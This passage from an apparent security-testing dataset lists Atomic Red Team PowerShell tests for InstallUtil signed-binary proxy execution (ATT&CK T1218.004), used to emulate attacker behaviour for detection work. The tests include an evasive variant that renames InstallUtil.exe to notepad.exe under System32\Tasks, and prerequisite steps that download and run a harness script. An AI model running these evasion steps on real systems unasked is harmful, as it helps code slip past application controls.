  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:TEMP\\"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/? `"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_HelpText_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil HelpText property execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/? `"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_HelpText_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'Executable'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil HelpText property execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "T1218.004.dll"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/? `"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_HelpText_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil HelpText property execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:windir\\System32\\Tasks"\n'
             "$InstallerAssemblyFileName = 'readme.txt'\n"
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "readme.txt"\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '# Explicitly set the directory so that a relative path to '
             'readme.txt can be supplied.\n'
             'Set-Location "$Env:windir\\System32\\Tasks"\n'
             '\n'
             'Copy-Item -Path '
             '"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" '
             '-Destination "$Env:windir\\System32\\Tasks\\notepad.exe"\n'
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'Executable'\n"
             '    CommandLine = $CommandLine\n'
             '    InstallUtilPath = '
             '"$Env:windir\\System32\\Tasks\\notepad.exe"\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'Evasive Installutil invocation test failure. Installer assembly '
             'execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: InstallUtil': {'atomic_tests': [{'auto_generated_guid': 'ffd9c807-d402-47d2-879d-f915cf2a3a94',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'the '
                                                                                                         'CheckIfInstallable '
                                                                                                         'class '
                                                                                                         'constructor '
                                                                                                         'runner '
                                                                                                         'instead '
                                                                                                         'of '
                                                                                                         'executing '
                                                                                                         'InstallUtil. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'the '
                                                                                                         'InstallUtil '
                                                                                                         'test '
                                                                                                         'harness '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'executed.\n'
                                                                                                         'If '
                                                                                                         'no '
                                                                                                         'output '
                                                                                                         'is '
                                                                                                         'displayed '
                                                                                                         'the '
                                                                                                         'test '
                                                                                                         'executed '
                                                                                                         'successfuly.\n',
                                                                                          'executor': {'cleanup_command': '$InstallerAssemblyDir '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_dir}"\n'
                                                                                                                          '$InstallerAssemblyFileName '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_filename}"\n'
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '= '
                                                                                                                          'Join-Path '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyDir '
                                                                                                                          '-ChildPath '
                                                                                                                          '$InstallerAssemblyFileName\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_dir}"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_filename}"\n'
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_'\n"
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'#{invocation_method}'\n"
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs '
                                                                                                                  '-MinimumViableAssembly\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'CheckIfInstallable '
                                                                                                                  'method '
                                                                                                                  'execution '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'assembly_dir': {'default': '$Env:TEMP\\',
                                                                                                                               'description': 'directory '
                                                                                                                                              'to '
                                                                                                                                              'drop '
                                                                                                                                              'the '
                                                                                                                                              'compiled '
                                                                                                                                              'installer '
                                                                                                                                              'assembly',
                                                                                                                               'type': 'Path'},
                                                                                                              'assembly_filename': {'default': 'T1218.004.dll',
                                                                                                                                    'description': 'filename '
                                                                                                                                                   'of '
                                                                                                                                                   'the '
                                                                                                                                                   'compiled '
                                                                                                                                                   'installer '
                                                                                                                                                   'assembly',
                                                                                                                                    'type': 'String'},
                                                                                                              'invocation_method': {'default': 'CheckIfInstallable',
                                                                                                                                    'description': 'the '
                                                                                                                                                   'type '
                                                                                                                                                   'of '
                                                                                                                                                   'InstallUtil '
                                                                                                                                                   'invocation '
                                                                                                                                                   'variant '
                                                                                                                                                   '- '
                                                                                                                                                   'Executable, '
                                                                                                                                                   'InstallHelper, '
                                                                                                                                                   'or '
                                                                                                                                                   'CheckIfInstallable',
                                                                                                                                    'type': 'String'},
                                                                                                              'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'CheckIfInstallable '
                                                                                                  'method '
                                                                                                  'call',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': 'd43a5bde-ae28-4c55-a850-3f4c80573503',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'the '
                                                                                                         'InstallHelper '
                                                                                                         'class '
                                                                                                         'constructor '
                                                                                                         'runner '
                                                                                                         'instead '
                                                                                                         'of '
                                                                                                         'executing '
                                                                                                         'InstallUtil. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'no '
                                                                                                         'output '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed '
                                                                                                         'if '
                                                                                                         'the '
                                                                                                         'test\n'
                                                                                                         'executed '
                                                                                                         'successfuly.\n',
                                                                                          'executor': {'cleanup_command': '$InstallerAssemblyDir '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_dir}"\n'
                                                                                                                          '$InstallerAssemblyFileName '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_filename}"\n'
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '= '
                                                                                                                          'Join-Path '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyDir '
                                                                                                                          '-ChildPath '
                                                                                                                          '$InstallerAssemblyFileName\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_dir}"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_filename}"\n'
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '\n'
                                                                                                                  '$CommandLine '
                                                                                                                  '= '
                                                                                                                  '"/logfile= '
                                                                                                                  '/logtoconsole=false '
                                                                                                                  '`"$InstallerAssemblyFullPath`""\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_'\n"
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'#{invocation_method}'\n"
                                                                                                                  '    '
                                                                                                                  'CommandLine '
                                                                                                                  '= '
                                                                                                                  '$CommandLine\n'
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs '
                                                                                                                  '-MinimumViableAssembly\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'InstallHelper '
                                                                                                                  'method '
                                                                                                                  'execution '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'assembly_dir': {'default': '$Env:TEMP\\',
                                                                                                                               'description': 'directory '
                                                                                                                                              'to '
                                                                                                                                              'drop '
                                                                                                                                              'the '
                                                                                                                                              'compiled '
                                                                                                                                              'installer '
                                                                                                                                              'assembly',
                                                                                                                               'type': 'Path'},
                                                                                                              'assembly_filename': {'default': 'T1218.004.dll',
                                                                                                                                    'description': 'filename '
                                                                                                                                                   'of '
                                                                                                                                                   'the '
                                                                                                                                                   'compiled '
                                                                                                                                                   'installer '
                                                                                                                                                   'assembly',
                                                                                                                                    'type': 'String'},
                                                                                                              'invocation_method': {'default': 'InstallHelper',
                                                                                                                                    'description': 'the '
                                                                                                                                                   'type '
                                                                                                                                                   'of '
                                                                                                                                                   'InstallUtil '
                                                                                                                                                   'invocation '
                                                                                                                                                   'variant '
                                                                                                                                                   '- '
                                                                                                                                                   'Executable, '
                                                                                                                                                   'InstallHelper, '
                                                                                                                                                   'or '
                                                                                                                                                   'CheckIfInstallable',
                                                                                                                                    'type': 'String'},
                                                                                                              'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'InstallHelper '
                                                                                                  'method '
                                                                                                  'call',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '9b7a7cfc-dd2e-43f5-a885-c0a3c270dd93',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'the '
                                                                                                         'installer '
                                                                                                         'assembly '
                                                                                                         'class '
                                                                                                         'constructor. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'version '
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed '
                                                                                                         'the '
                                                                                                         '.NET '
                                                                                                         'framework '
                                                                                                         'install '
                                                                                                         'utility.\n',
                                                                                          'executor': {'cleanup_command': '$InstallerAssemblyDir '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_dir}"\n'
                                                                                                                          '$InstallerAssemblyFileName '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_filename}"\n'
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '= '
                                                                                                                          'Join-Path '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyDir '
                                                                                                                          '-ChildPath '
                                                                                                                          '$InstallerAssemblyFileName\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_dir}"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_filename}"\n'
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '\n'
                                                                                                                  '$CommandLine '
                                                                                                                  '= '
                                                                                                                  '"/logfile= '
                                                                                                                  '/logtoconsole=false '
                                                                                                                  '`"$InstallerAssemblyFullPath`""\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_'\n"
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'#{invocation_method}'\n"
                                                                                                                  '    '
                                                                                                                  'CommandLine '
                                                                                                                  '= '
                                                                                                                  '$CommandLine\n'
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs '
                                                                                                                  '-MinimumViableAssembly\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'InstallUtil '
                                                                                                                  'class '
                                                                                                                  'constructor '
                                                                                                                  'execution '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'assembly_dir': {'default': '$Env:TEMP\\',
                                                                                                                               'description': 'directory '
                                                                                                                                              'to '
                                                                                                                                              'drop '
                                                                                                                                              'the '
                                                                                                                                              'compiled '
                                                                                                                                              'installer '
                                                                                                                                              'assembly',
                                                                                                                               'type': 'Path'},
                                                                                                              'assembly_filename': {'default': 'T1218.004.dll',
                                                                                                                                    'description': 'filename '
                                                                                                                                                   'of '
                                                                                                                                                   'the '
                                                                                                                                                   'compiled '
                                                                                                                                                   'installer '
                                                                                                                                                   'assembly',
                                                                                                                                    'type': 'String'},
                                                                                                              'invocation_method': {'default': 'Executable',
                                                                                                                                    'description': 'the '
                                                                                                                                                   'type '
                                                                                                                                                   'of '
                                                                                                                                                   'InstallUtil '
                                                                                                                                                   'invocation '
                                                                                                                                                   'variant '
                                                                                                                                                   '- '
                                                                                                                                                   'Executable, '
                                                                                                                                                   'InstallHelper, '
                                                                                                                                                   'or '
                                                                                                                                                   'CheckIfInstallable',
                                                                                                                                    'type': 'String'},
                                                                                                              'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'InstallUtil '
                                                                                                  'class '
                                                                                                  'constructor '
                                                                                                  'method '
                                                                                                  'call',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '9f9968a6-601a-46ca-b7b7-6d4fe0f98f0b',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'the '
                                                                                                         'Install '
                                                                                                         'Method. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'version '
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed '
                                                                                                         'the '
                                                                                                         '.NET '
                                                                                                         'framework '
                                                                                                         'install '
                                                                                                         'utility.\n',
                                                                                          'executor': {'cleanup_command': '$InstallerAssemblyDir '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_dir}"\n'
                                                                                                                          '$InstallerAssemblyFileName '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_filename}"\n'
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '= '
                                                                                                                          'Join-Path '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyDir '
                                                                                                                          '-ChildPath '
                                                                                                                          '$InstallerAssemblyFileName\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_dir}"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_filename}"\n'
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
